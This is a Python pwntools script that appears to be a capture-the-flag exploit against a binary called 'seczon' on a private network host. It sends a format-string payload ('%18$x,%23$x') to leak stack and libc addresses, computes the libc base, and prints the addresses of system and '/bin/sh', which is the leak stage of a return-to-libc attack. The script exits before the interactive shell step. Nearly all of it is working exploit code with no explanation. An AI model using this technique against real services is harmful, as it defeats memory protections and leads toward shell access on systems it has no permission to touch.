from pwn import *
import time
import sys


def add(p):
    print(p.recvuntil(">> "))
    p.sendline("1")
    time.sleep(0.2)
    print(p.recvuntil(">> "))
    p.sendline("0")

def leak(p):
    print(p.recvuntil(">> "))
    p.sendline("2")
    time.sleep(0.2)
    print(p.recvuntil(">> "))
    p.sendline("0")
    time.sleep(0.2)
    print(p.recvuntil(">> "))
    p.sendline("%18$x,%23$x")
    p.recvuntil("0\n")
    return p.recvline().split(",")

context.binary = "./seczon"
binary = ELF("./seczon")
libc = ELF("./libc.so.6")

limit = 34

host = "192.168.250.173"
port = 20000

p = remote(host, port)

add(p)
r = leak(p)
print(r)
ret_addr_from_main = int(r[0], 16) + 0x14
libc.address = int(r[1], 16) - 243 - libc.symbols["__libc_start_main"]
print(hex(ret_addr_from_main))
print(hex(libc.address))
print(hex(libc.symbols["system"]))
print(hex(next(libc.search("/bin/sh\x00"))))

sys.exit()
p.interactive()
